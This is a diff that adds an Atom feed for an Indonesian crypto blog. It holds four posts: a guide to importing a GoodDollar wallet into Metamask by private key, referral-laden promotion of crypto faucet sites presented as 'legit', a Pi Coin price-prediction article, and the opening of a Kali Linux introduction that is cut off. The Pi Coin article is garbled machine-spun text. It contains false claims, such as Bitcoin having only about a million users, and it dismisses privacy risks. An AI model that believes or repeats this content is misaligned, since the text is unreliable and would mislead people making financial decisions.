@@ -1,0 +1,686 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-02-01T07:02:42+07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">DaffaDev</title><subtitle>Blog from Nowhere</subtitle><entry><title type="html">Cara Menghubungkan GoodDollar ke Metamask</title><link href="http://localhost:4000/Cara-Menghubungkan-GoodDollar-ke-Metamask" rel="alternate" type="text/html" title="Cara Menghubungkan GoodDollar ke Metamask" /><published>2022-01-03T00:00:00+07:00</published><updated>2022-01-03T00:00:00+07:00</updated><id>http://localhost:4000/Cara-Menghubungkan-GoodDollar-ke-Metamask</id><content type="html" xml:base="http://localhost:4000/Cara-Menghubungkan-GoodDollar-ke-Metamask">&lt;p&gt;Menghubungkan GoodDollar ke Metamask umumnya diperlukan jika seseorang ingin bertransaksi&lt;!--more--&gt; di platform yang memerlukan conect wallet sehingga harus dibuka melalui browser DAPP Metamask.&lt;/p&gt;
+
+&lt;p&gt;Selain itu, metode ini juga berguna bagi orang yang ingin memindah G$ ke wallet pribadinya. Karena sejauh ini pihak GoodDollar belum menyediakan menu transer ke wallet external.&lt;/p&gt;
+
+&lt;h3 id=&quot;1-persiapan&quot;&gt;1. Persiapan&lt;/h3&gt;
+&lt;p&gt;Panduan ini mengasumsikan:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Anda telah mendaftar GoodDollar, jika belum Anda bisa mendapatkannya disini &lt;a href=&quot;https://gooddollarregistration.page.link/claimeveryday&quot;&gt;wallet.gooddollar.org&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;Anda telah memiliki dompet metamask, jika belum silahkan buat &lt;a href=&quot;https://metamask.io/download.html&quot;&gt;disini&lt;/a&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;2-salin-private-key-gooddollar&quot;&gt;2. Salin Private Key GoodDollar&lt;/h3&gt;
+&lt;ol&gt;
+  &lt;li&gt;Login ke akun GoodDollar dan pilih menu Export Wallet.&lt;/li&gt;
+  &lt;li&gt;Copy Private key untuk proses expor wallet ke metamask lalu simpan di tempat yang aman.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;3-expor-kunci-pribadi-ke-metamask&quot;&gt;3. Expor kunci pribadi ke metamask&lt;/h3&gt;
+&lt;p&gt;Buka aplikasi Metamask. Panduan ini mengasumsikan Anda telah memiliki sebuah akun di Metamask. Jika belum silahkan buat terlebih dulu atau masuk ke wallet Anda dengan memasukan 12 Phrase dari Trust Wallet atau Safepal.
+Klik Impor Akun dan masukan Private key GoodDollar disana lalu pilih Done. Dengan begitu seharusnya wallet baru telah berhasil di Impor ke akun metamask Anda.&lt;/p&gt;
+
+&lt;h3 id=&quot;4-pindah-ke-jaringan-fuse-network&quot;&gt;4. Pindah ke Jaringan Fuse Network&lt;/h3&gt;
+&lt;p&gt;Sampai disini Anda masih belum bisa menambahkan token GoodDollar di wallet metamask karena masih berada di jaringan ETH. Silahkan ikuti step berikut untuk merubah jaringan Etherium ke FUSE Network.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Buka metamask dan pilih Pengaturan&lt;/li&gt;
+  &lt;li&gt;Selanjutnya ini kolom yang muncul dengan isian berikut.
+    &lt;ul&gt;
+      &lt;li&gt;Nama Jaringan: FUSE NETWORK&lt;/li&gt;
+      &lt;li&gt;Url RPC: https://rpc.fuse.io/&lt;/li&gt;
+      &lt;li&gt;ID Rantai: 122&lt;/li&gt;
+      &lt;li&gt;Simbol: FUSE&lt;/li&gt;
+      &lt;li&gt;URL Block Explorer: https://explorer.fuse.io/&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Contoh pengisian dapat disesuaikan dengan gambar ini:
+&lt;img src=&quot;/images/fuse.png&quot; alt=&quot;metamask&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Dan hasilnya akan seperti gambar dibawah.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/fusetoken.png&quot; alt=&quot;fusetoken&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Selanjutnya masukan Contract address berikut di kolom yang muncul.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Token Contract Address: 0x495d133B938596C9984d462F007B676bDc57eCEC&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Contoh hasil pengisian kurang lebih seperti gambar berikut.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/gooddollar.png&quot; alt=&quot;gooddollar&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Dengan mengikuti cara diatas kini wallet GoodDollar telah berhasil di impor ke metamask.
+&lt;img src=&quot;/images/G$.png&quot; alt=&quot;gdollar&quot; /&gt;&lt;/p&gt;</content><author><name>x1666</name></author><category term="Crypto" /><summary type="html">Menghubungkan GoodDollar ke Metamask umumnya diperlukan jika seseorang ingin bertransaksi</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://warnabiru.com/wp-content/uploads/2021/06/GoodDollar-ke-Metamask-696x385.jpg" /><media:content medium="image" url="https://warnabiru.com/wp-content/uploads/2021/06/GoodDollar-ke-Metamask-696x385.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Situs LEGIT Penghasil Crypto</title><link href="http://localhost:4000/Situs-Legit-Penghasil-Crypto-Dan-Dollar" rel="alternate" type="text/html" title="Situs LEGIT Penghasil Crypto" /><published>2021-11-06T00:00:00+07:00</published><updated>2021-11-06T00:00:00+07:00</updated><id>http://localhost:4000/Situs-Legit-Penghasil-Crypto-Dan-Dollar</id><content type="html" xml:base="http://localhost:4000/Situs-Legit-Penghasil-Crypto-Dan-Dollar">&lt;p&gt;Kamu yang sedang melongo, ngelamun ga karuan mendingan langsung baca ini, Situs&lt;!--more--&gt; penghasil uang ini cukup Legit karena terbukti membayar untuk hasil kerja kita di situs mereka.&lt;/p&gt;
+
+&lt;p&gt;Dibawah ini hasil yanng saya dapat selama nganggur dirumah karena &lt;b&gt;“pirusKORONA”&lt;/b&gt;, Lumayan daripada keluyuran ga tentu, daripada ngerjain sesuatu yang ga ada gunanya, mending nyambung hidup. Nah selain dari hasil keran crypto, saya juga mencoba mining crypto gratisan di website penyedia mining cloud server.
+&lt;img src=&quot;/images/pembayaran.webp&quot; alt=&quot;pembayaran&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;dan ini hasil saat ini, setelah mengumpulkan receh-receh dari situs yang menghasilkan crypto secara gratisan.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/hasilnambang.webp&quot; alt=&quot;hasil-nambang&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Semua terkumpul di satu situs &lt;a href=&quot;https://faucetpay.io/?r=2868420&quot;&gt;Faucet&lt;/a&gt; yang masih terpercaya membayar sampai saat ini. Disitus ini kamu bisa menukarkan setiap Coin Crypto ke satu Crypto tertentu. di kasus ini saya menukarkan semua Crypto murah ke satu Crypto saja, yaitu Bitcoin tentunya, selain harganya yang istimewa, mining bitcoin pun terbilang susah-susah gampang.&lt;/p&gt;
+
+&lt;p&gt;Situs ini penting untuk mengumpulkan hasil kerja kita pada situs-situs yang kita tambang. silahkan daftar &lt;a href=&quot;https://faucetpay.io/?r=2868420&quot;&gt;DISINI&lt;/a&gt; jika belum punya.&lt;/p&gt;
+
+&lt;p&gt;Untuk situs-situs penghasil crypto ataupun dollar tersebut ada beberapa yang saya percayai dan memang membayar.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;1-faucetcrypto&quot;&gt;1. &lt;a href=&quot;https://faucetcrypto.com/ref/1585924&quot;&gt;FAUCETCRYPTO&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/faucetcrypto.webp&quot; alt=&quot;faucetcrypto&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Di &lt;a href=&quot;https://faucetcrypto.com/ref/1585924&quot;&gt;faucetcrypto&lt;/a&gt; setiap hari kita di beri tugas untuk membuka situs-situs yang sudah disiapkan biasanya sebanyak 20 situs, dengan imbalan coin dengan nilai yang bervariasi. Dan minimum widhtdraw adalah 1000 coin untuk di tukar bitcoin sebanyak 0.00000077 BTC, ada pula claim reward gratis setiap 25menit, juga tugas klik link.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;2-coinpot&quot;&gt;2. &lt;a href=&quot;https://coinpot.in/?r=62823&quot;&gt;COINPOT&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/coinpot.webp&quot; alt=&quot;coinpot&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://coinpot.in/?r=62823&quot;&gt;coinpot.in&lt;/a&gt; sama hal nya dengan &lt;a href=&quot;https://faucetcrypto.com/ref/1585924&quot;&gt;faucetcrypto.com&lt;/a&gt; Hanya beda tampilan, dan beda reward.
+&lt;img src=&quot;/images/proof.webp&quot; alt=&quot;proof&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Untuk Withdraw bisa langsung ke wallet Crypto kamu, bisa juga ke akun &lt;a href=&quot;https://faucetpay.io/?r=2868420&quot;&gt;faucetpay.io&lt;/a&gt; Atau ke CoinEx Saya sendiri withdraw langsung ke akun faucetpay karena disanalah berkumpulnya coin-coin cripto saya, untuk metode WD langsung ke wallet, hanya bisa di WD ke Coin &lt;b&gt;Bittorrent, XRP, EOS, Steller, ADA&lt;/b&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;3-btcspinner&quot;&gt;3. &lt;a href=&quot;https://btcspinner.io/invite/380760&quot;&gt;BTCSPINNER&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/btcspinner.webp&quot; alt=&quot;BTCSPINNER&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://btcspinner.io/invite/380760&quot;&gt;btcspinner.io&lt;/a&gt; website miner yang satu ini lebih beda, mereka membuat layaknya spinner saat kita menekan tombol spin papan spiner akan berputar, dan berhenti di satu titik pilihan yang akan menjadi reward untuk kita. untuk lebih jelas cara memainkannya silahkan masuk ke halaman &lt;a href=&quot;https://btcspinner.io/invite/380760&quot;&gt;btcspinner.io&lt;/a&gt;
+&lt;br /&gt;&lt;/p&gt;</content><author><name>x1666</name></author><category term="Crypto" /><summary type="html">Kamu yang sedang melongo, ngelamun ga karuan mendingan langsung baca ini, Situs</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://upload.wikimedia.org/wikipedia/commons/b/b8/Cryptocurrency_logos.jpg" /><media:content medium="image" url="https://upload.wikimedia.org/wikipedia/commons/b/b8/Cryptocurrency_logos.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Prediksi harga Pi Coin 2021-2025</title><link href="http://localhost:4000/jaringan-pi-prediksi-harga-coin-pi-untuk-tahun-2021-2025" rel="alternate" type="text/html" title="Prediksi harga Pi Coin 2021-2025" /><published>2021-11-05T00:00:00+07:00</published><updated>2021-11-05T00:00:00+07:00</updated><id>http://localhost:4000/jaringan-pi-prediksi-harga-coin-pi-untuk-tahun-2021-2025</id><content type="html" xml:base="http://localhost:4000/jaringan-pi-prediksi-harga-coin-pi-untuk-tahun-2021-2025">&lt;p&gt;Pi Network (PI) adalah koin terkomputerisasi terbaru untuk memerintahkan pemberitahuan&lt;!--more--&gt; dari area lokal uang digital, bahkan sebelum sepenuhnya dikirim. Beberapa klien melihatnya sebagai pendekatan untuk terlibat dalam uang kriptografi mulai dari tahap paling awal dan mendapat manfaat di kemudian hari, sama halnya dengan para pengguna awal Bitcoin yang telah menumpuk peningkatan besar dari menambang dan memegang koin. Meskipun demikian, orang lain telah membandingkan Pi dengan trik staggered showcasing (MLM) yang tidak bernilai.&lt;/p&gt;
+
+&lt;p&gt;Namun, apa itu &lt;a href=&quot;/jaringan-pi-prediksi-harga-coin-pi-untuk-tahun-2021-2025&quot;&gt;Jaringan Pi&lt;/a&gt; dan bagaimana fungsinya? Pernahkah Anda mengetahui tentang mata uang digital Pi dan akankah Anda mengatakan bahwa Anda berharap untuk menemukan lebih banyak tentangnya sebagai usaha yang diharapkan?&lt;/p&gt;
+
+&lt;p&gt;Artikel ini memberikan garis besar tentang apa yang ingin dicapai Jaringan Pi dan bagaimana ekspektasi nilai mata uang digital Pi sekarang mulai membuahkan hasil.&lt;/p&gt;
+
+&lt;h2 id=&quot;apa-itu-jaringan-pi&quot;&gt;Apa itu &lt;a href=&quot;/jaringan-pi-prediksi-harga-coin-pi-untuk-tahun-2021-2025&quot;&gt;Jaringan Pi&lt;/a&gt;?&lt;/h2&gt;
+
+&lt;p&gt;Pi Network adalah proyek tunai terkomputerisasi yang berarti menjaga penambangan kripto tetap terbuka karena sentralisasi bentuk moneter asli seperti Bitcoin telah membuat mereka jauh dari klien biasa. Jaringan Pi, dibuat oleh sekelompok lulusan Stanford, memberdayakan klien untuk menambang koin menggunakan aplikasi ponselnya, menyetujui pertukaran pada catatan yang disampaikan.&lt;/p&gt;
+
+&lt;p&gt;Dengan penandaan yang bergantung pada angka π, Fase 1 dari usaha tersebut dikirim pada 2019 pada Hari &lt;a href=&quot;/jaringan-pi-prediksi-harga-coin-pi-untuk-tahun-2021-2025&quot;&gt;Pi&lt;/a&gt;, 14 Maret, dengan aplikasi penambangan Pi gratis. Pada Juni 2019, organisasi memiliki lebih dari 100.000 klien dinamis, dan setelah setahun ketika Fase 2 dikirim, ada lebih dari 3,5 juta. Aplikasi mulai menjalankan promosi pada Mei 2020 untuk memberikan sumber pembiayaan bagi usaha tersebut. Basis klien mencapai 14 juta pada Maret 2021, setelah melewati 12 juta jejak pada Februari.&lt;/p&gt;
+
+&lt;p&gt;Pi Coin adalah uang kriptografi yang tiba-tiba melonjak dalam permintaan untuk organisasi &lt;a href=&quot;/jaringan-pi-prediksi-harga-coin-pi-untuk-tahun-2021-2025&quot;&gt;Pi&lt;/a&gt;, dan seperti cryptos lainnya, misalnya, Bitcoin, &lt;a href=&quot;/jaringan-pi-prediksi-harga-coin-pi-untuk-tahun-2021-2025&quot;&gt;Pi&lt;/a&gt; dimaksudkan untuk melalui “pemisahan” biasa untuk memastikan kekurangannya. Membagi adalah titik di mana jumlah koin yang diperoleh ekskavator untuk menangani pertukaran baru sangat berkurang ketika pencapaian tertentu tercapai.&lt;/p&gt;
+
+&lt;p&gt;Tingkat penambangan &lt;a href=&quot;/jaringan-pi-prediksi-harga-coin-pi-untuk-tahun-2021-2025&quot;&gt;Pi&lt;/a&gt; dibagi dari 1,6 π setiap jam ketika tiba di 100.000 klien, dibagi lagi menjadi 0,4 π setiap jam ketika mencapai 1 juta dan sekali lagi menjadi 0,2 π ketika mencapai 10 juta. Ini akan terus membelah, mencapai nol pada 1 miliar klien.&lt;/p&gt;
+
+&lt;p&gt;Selama periode kedua tugas saat ini, klien dapat memilih untuk mencoba pemrograman area kerja Pi Node di PC mereka. Bagaimanapun, kapan pengiriman Fase 3 - apakah akan dilakukan pada tahun 2021? Sesuai dengan desainer, awal dari tahap ketiga belum ditentukan sebelumnya namun bergantung pada kemajuan yang dibuat pada tahap berikutnya.&lt;/p&gt;
+
+&lt;p&gt;Berbeda dengan hub dalam organisasi, seperti Bitcoin atau Ethereum yang menggunakan konvensi kerja, &lt;a href=&quot;/jaringan-pi-prediksi-harga-coin-pi-untuk-tahun-2021-2025&quot;&gt;Pi&lt;/a&gt; Nodes menggunakan perhitungan yang bergantung pada Stellar Consensus Protocol (SCP). Pi Nodes menyetujui pertukaran pada catatan yang disampaikan dan mencapai kesepakatan tentang permintaan pertukaran baru yang dicatat oleh catatan.&lt;/p&gt;
+
+&lt;p&gt;Di bawah SCP, &lt;a href=&quot;/jaringan-pi-prediksi-harga-coin-pi-untuk-tahun-2021-2025&quot;&gt;Pi&lt;/a&gt; Nodes menyusun lingkaran keamanan, atau pertemuan, dari tiga hingga lima individu yang dipercaya yang diketahui oleh setiap klien organisasi. Lingkaran keamanan mengumpulkan jaringan kepercayaan di seluruh dunia yang mencegah pertukaran palsu, karena pertukaran harus disetujui pada catatan umum jika hub yang dipercaya mendukungnya.&lt;/p&gt;
+
+&lt;h2 id=&quot;pi-coin-tetap-dalam-mode-pra-rilis&quot;&gt;&lt;a href=&quot;/jaringan-pi-prediksi-harga-coin-pi-untuk-tahun-2021-2025&quot;&gt;Pi&lt;/a&gt; Coin tetap dalam mode pra-rilis&lt;/h2&gt;
+
+&lt;p&gt;Jika Anda sedang mempertimbangkan cara membeli Pi Coin untuk portofolio Anda, itu belum bisa dibayangkan. Klien yang telah menambang mata uang digital Pi mungkin memiliki opsi untuk menarik atau memperdagangkan koin mereka selama periode ketiga usaha ketika &lt;a href=&quot;/jaringan-pi-prediksi-harga-coin-pi-untuk-tahun-2021-2025&quot;&gt;Pi&lt;/a&gt; pindah ke blockchain yang sepenuhnya terdesentralisasi. &lt;a href=&quot;/jaringan-pi-prediksi-harga-coin-pi-untuk-tahun-2021-2025&quot;&gt;Pi&lt;/a&gt; tidak dapat dipindahkan selama tahap pengujian, untuk menyimpan catatan palsu dari pengumpulan koin, sesuai situs yang dijalankan. Penyesuaian dompet Pi harus diperhatikan ketika Pi bergeser dari testnet ke mainnet, ketika konvensi blockchain muncul dari peningkatan dan sepenuhnya disampaikan.&lt;/p&gt;
+
+&lt;p&gt;Selanjutnya, &lt;a href=&quot;/jaringan-pi-prediksi-harga-coin-pi-untuk-tahun-2021-2025&quot;&gt;Pi&lt;/a&gt; Coin belum dapat ditukar pada salah satu perdagangan uang kriptografi atau tahap pertukaran.&lt;/p&gt;
+
+&lt;p&gt;Ketika Tahap 3 dikirim, pemegang benar-benar ingin bertanggung jawab penuh atas kunci dompet pribadi dan publik mereka dan menggunakan koin untuk membeli barang dan administrasi di pusat komersial terdistribusi Pi atau menukarnya dengan uang tunai. Tanpa kunci, klien tidak dapat memindahkan atau membelanjakan uang tunai yang mereka pegang.&lt;/p&gt;
+
+&lt;p&gt;Aplikasi portabel &lt;a href=&quot;/jaringan-pi-prediksi-harga-coin-pi-untuk-tahun-2021-2025&quot;&gt;Pi&lt;/a&gt; berfungsi sebagai dompet uang kriptografi, terhubung ke nomor telepon klien atau akun Facebook. Sama seperti dengan blockchain publik lainnya, blockchain Pi akan mengizinkan dompet luar untuk menyimpan koin Pi dan mengeksekusinya dengan mengirimkan pertukaran langsung ke blockchain. Namun, tidak seperti blockchain lainnya, para insinyurnya belum mengirimkan kode sumbernya.&lt;/p&gt;
+
+&lt;p&gt;Pada bulan Desember 2020, insinyur &lt;a href=&quot;/jaringan-pi-prediksi-harga-coin-pi-untuk-tahun-2021-2025&quot;&gt;Pi&lt;/a&gt; mempresentasikan aplikasi Brainstorming Pi lainnya untuk memungkinkan klien mengusulkan pemikiran aplikasi, bergabung dengan proyek dan menarik klien yang berbeda.&lt;/p&gt;
+
+&lt;p&gt;Pengadopsi awal mengumpulkan &lt;a href=&quot;/jaringan-pi-prediksi-harga-coin-pi-untuk-tahun-2021-2025&quot;&gt;Pi&lt;/a&gt; crypto dengan harapan bahwa biayanya akan meningkat pesat setelah Fase 3 ditayangkan. Meskipun tingkat penambangan koin telah dikurangi dengan membagi, klien dapat membangun tingkat penambangan mereka dengan mengaitkan dengan ekskavator dinamis lainnya. Klien baru dapat bergabung dengan Jaringan Pi jika mereka memiliki kode referensi dari klien lain.&lt;/p&gt;
+
+&lt;p&gt;Perancang tugas menjamin bahwa keamanan &lt;a href=&quot;/jaringan-pi-prediksi-harga-coin-pi-untuk-tahun-2021-2025&quot;&gt;Jaringan Pi&lt;/a&gt; ditingkatkan oleh organisasi yang dekat dengan rumah, mendesak klien untuk mendapatkan orang yang dicintai - yang memprovokasi kewaspadaan bahwa ini adalah model bisnis yang menampilkan atau menipu secara terhuyung-huyung. Meskipun demikian, penting bahwa klien dapat memperoleh koin dari organisasi langsung mereka sendiri - dan bukan dari organisasi asosiasi mereka juga dengan konspirasi MLM.&lt;/p&gt;
+
+&lt;p&gt;Beberapa penonton uang digital telah secara efektif mulai membuat perkiraan harga &lt;a href=&quot;/jaringan-pi-prediksi-harga-coin-pi-untuk-tahun-2021-2025&quot;&gt;Jaringan Pi&lt;/a&gt; mereka. Bagaimana kalau kita menyelidiki berapa biaya Pi yang mungkin akan menjadi titik di mana ia mulai bertukar.&lt;/p&gt;
+
+&lt;h2 id=&quot;jaringan-pi-prediksi-harga-pi-coin-untuk-tahun-2021-2025&quot;&gt;&lt;a href=&quot;/jaringan-pi-prediksi-harga-coin-pi-untuk-tahun-2021-2025&quot;&gt;Jaringan Pi&lt;/a&gt;: Prediksi harga Pi Coin untuk tahun 2021-2025&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://ichi.pro/assets/images/max/724/1*9fHMoPauRFe_QPjl996D1Q.png&quot; alt=&quot;pinetwork&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Demikian juga dengan koin terkomputerisasi lainnya saat pengiriman, harga uang kriptografi &lt;a href=&quot;/jaringan-pi-prediksi-harga-coin-pi-untuk-tahun-2021-2025&quot;&gt;Pi&lt;/a&gt; mungkin akan mulai pada tingkat yang umumnya rendah terhadap dolar AS dan naik seiring dengan berkembangnya pemanfaatannya. Apa yang direkomendasikan sebagian dari angka-angka nilai?&lt;/p&gt;
+
+&lt;p&gt;Pada saat penulisan, pada tanggal 18 Maret, perkiraan nilai &lt;a href=&quot;/jaringan-pi-prediksi-harga-coin-pi-untuk-tahun-2021-2025&quot;&gt;Jaringan Pi&lt;/a&gt; &lt;a href=&quot;https://digitalcoinprice.com/&quot;&gt;digitalcoinprice.com&lt;/a&gt; 2021-2025 memproyeksikan bahwa biaya koin akan naik dari normal 0,0107 terhadap dolar AS pada tahun 2021 menjadi $ 0,0127 pada tahun 2022, dan $ 0,0212 pada tahun 2025. Istilah konyol , itu mengantisipasi biaya PI menjadi rata-rata $ 0,0319 pada tahun 2028.&lt;/p&gt;
+
+&lt;p&gt;Sementara itu, perkiraan administrasi berbasis perhitungan Wallet Investor memiliki perkiraan nilai &lt;a href=&quot;/jaringan-pi-prediksi-harga-coin-pi-untuk-tahun-2021-2025&quot;&gt;Pi&lt;/a&gt;  Coin $ 0,0132, dengan kekurangan $ 0,00743.&lt;/p&gt;
+
+&lt;p&gt;Bergantung pada jumlah klien mata uang digital dan perdagangan yang menerima &lt;a href=&quot;/jaringan-pi-prediksi-harga-coin-pi-untuk-tahun-2021-2025&quot;&gt;Pi&lt;/a&gt; , kasus banteng dapat melihat harga Pi mencapai $ 1 jika dikirim sebelum akhir 2021, seperti yang ditunjukkan oleh perdagangan crypto Changelly. Istilah yang tidak masuk akal, biayanya bisa naik menjadi $ 5 pada tahun 2025, Changelly memprediksi.&lt;/p&gt;
+
+&lt;p&gt;Akankah &lt;a href=&quot;/jaringan-pi-prediksi-harga-coin-pi-untuk-tahun-2021-2025&quot;&gt;Pi&lt;/a&gt;  Coin melewati $ 1 di masa depan? Ikuti &lt;a href=&quot;https://capital.com/id&quot;&gt;capital.com&lt;/a&gt; untuk menjadi salah satu yang pertama menemukan estimasi nilai &lt;a href=&quot;/jaringan-pi-prediksi-harga-coin-pi-untuk-tahun-2021-2025&quot;&gt;Pi&lt;/a&gt; / USD yang diperbarui setelah informasi lebih lanjut terbuka.&lt;/p&gt;
+
+&lt;h2 id=&quot;apakah-ada-bahaya-menggunakan-aplikasi&quot;&gt;Apakah Ada Bahaya Menggunakan Aplikasi?&lt;/h2&gt;
+&lt;h3 id=&quot;tidak-juga&quot;&gt;“Tidak juga…”&lt;/h3&gt;
+
+&lt;p&gt;Jika Anda khawatir orang-orang di belakang Jaringan Pi ingin mencuri data pribadi Anda dan hanya menggunakan Anda untuk menampilkan iklan, pikirkan saja: aplikasi lain mungkin tetap melakukan ini. Juga, jika Anda adalah salah satu dari orang-orang yang mengeluh bahwa dibutuhkan terlalu banyak usaha untuk memberikan satu ketukan sehari … ayolah! Betulkah? Anda bercanda, kan?&lt;/p&gt;
+
+&lt;h2 id=&quot;berapa-nilai-pi-saat-didaftarkan&quot;&gt;Berapa Nilai Pi Saat Didaftarkan?&lt;/h2&gt;
+&lt;h3 id=&quot;nilainya-bisa-berapa-saja&quot;&gt;“Nilainya bisa berapa saja”&lt;/h3&gt;
+
+&lt;p&gt;Seperti yang Anda lihat dari gambar, saya memiliki ribuan Pi dan bahkan jika satu Pi bernilai 0,01 dolar, saya masih akan mendapatkan sesuatu pada awalnya dan nilainya akan meningkat seiring waktu. Coba pikirkan: Pi Network memiliki hampir 20 juta pengguna dan Mainnet-nya bahkan belum diluncurkan, pada saat saya menulis ini, dan cryptocurrency dengan pengguna terbanyak adalah Bitcoin dengan jumlah lebih dari satu juta pengguna yang telah dicapai.
+bisa dilihat &lt;a href=&quot;https://fingfx.thomsonreuters.com/gfx/editorcharts/CRYPTO-CURRENCIES-ALTCOINS/0H001PBVN692/index.html&quot;&gt;REUTERS GRAPHICS&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;small&gt;sumber berita : &lt;a href=&quot;https://ichi.pro/id/jaringan-pi-prediksi-harga-pi-coin-untuk-tahun-2021-2025-95424867808603&quot;&gt;https://ichi.pro&lt;/a&gt;&lt;/small&gt;&lt;/p&gt;</content><author><name>x1666</name></author><category term="Crypto" /><category term="Crypto" /><summary type="html">Pi Network (PI) adalah koin terkomputerisasi terbaru untuk memerintahkan pemberitahuan</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://ichi.pro/assets/images/max/724/1*Sl5ixrTGREZgp_Yocv-YXg.png" /><media:content medium="image" url="https://ichi.pro/assets/images/max/724/1*Sl5ixrTGREZgp_Yocv-YXg.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Yang bisa dilakukan di kali linux</title><link href="http://localhost:4000/Yang-Bisa-Dilakukan-Dengan-Kali-Linux" rel="alternate" type="text/html" title="Yang bisa dilakukan di kali linux" /><published>2021-11-01T00:00:00+07:00</published><updated>2021-11-01T00:00:00+07:00</updated><id>http://localhost:4000/Yang-Bisa-Dilakukan-Dengan-Kali-Linux</id><content type="html" xml:base="http://localhost:4000/Yang-Bisa-Dilakukan-Dengan-Kali-Linux">&lt;p&gt;Bagi anda yang sudah terbiasa menggunakan windows, pasti masih asing dengan&lt;!--more--&gt; istilah Linux. Apalagi istilah Kali Linux. Biasanya perbedaan yang mencolok diantar windows dan linux ialah tampilannya.&lt;/p&gt;
+
+&lt;p&gt;Jika windows tampilannya muncul seperti beberapa ikon pilihan menu, namun di linux tampilannya lebih polos dan pengaturannya kebanyakan harus menggunakan koding lagi. Cocok bagi anda yang ingin belajar hacker.&lt;/p&gt;
+
+&lt;p&gt;Nah, bagi anda para Hacker pasti sudah tidak asing lagi dengan BackTrack, yaitu sebuah distro linux yang bertujuan untuk penetration dan testing keamanan pada sistem jaringan. Kali Linux mempunyai kurang lebih 300 tools yang ada di dalamnya dengan fungsi masing-masing. Untuk lebih jelasnya, artikel ini akan membahas tentang Apa itu Kali Linux Sejarah, Fungsi, dan Cara Kerjanya.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;apa-itu-kali-linux&quot;&gt;Apa Itu Kali Linux&lt;/h2&gt;
+
+&lt;p&gt;Kali Linux adalah system operasi berbasis debian linux yang di kembangkan oleh offensive Security. Dari segi tampilan Kali Linux memiliki tampilan sederhana dan tidak terlalu mencolok dan penggunaanya pun tergolong cukup mudah, sehingga sangat baik untuk para Pemula dalam melakukan penetrasi pada jaringan. Selain terdapat di PC, Kali Linux juga membuat ROM yang terdapat di Android yang disebut Kali Nethunter yang memiliki fungsi yang sama.&lt;/p&gt;
+
+&lt;p&gt;Kali Linux merupakan reinkarnasi daripada BackTrack, salah satu distri Linux yang diciptakan secara khusus supaya bisa memenuhi keperluan dalam penetration juga testing di sebuah system serta keamanan pada computer. Adanya Kali Linux diperkirakan akan lebih stabil serta powerful dari generasi yang sebelumnya adalah BackTrack. Pengembangan secara penuh sesuai dengan standar pengembangan pada Debian. Perilisan paling barunya sekarang ini yaitu Kali Linux 1.0.7 yang telah rilis pada Mei 2014.&lt;/p&gt;
+
+&lt;p&gt;Kali Linux telah dikembangkan serta didanai Offensive Security. Sama dengan pendahulunya yaitu BackTrack. Saat ini Kali Linux telah dikembangkan dengan cara open source serta tentu bisa didapatkan dengan gratis. Anda dapat melakukan perubahan di Kali Linux sesuai dengan keinginan anda, ada banyak lebih dari 300 tools yang harus di penerration testing dalam Kali Linux.&lt;/p&gt;
+
+&lt;p&gt;Penampilan yang ada pada system operasi yang mempunyai basis Linux ini dari segi penampilannya sangat sederhana serta tidak mencolok, penggunaan masuk golongan mudah, dengan demikian sangat bagus digunakan untuk pemula yang ingin melakukan penetration di jaringan. Bukan hanya di PC saja, adanya Kali Linux dapat menciptakan ROM yang ada di system Android yang dikenal dengan Kali Nethunter yang punya fungsi sama.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;sejarah-kali-linux&quot;&gt;Sejarah Kali Linux&lt;/h2&gt;
+
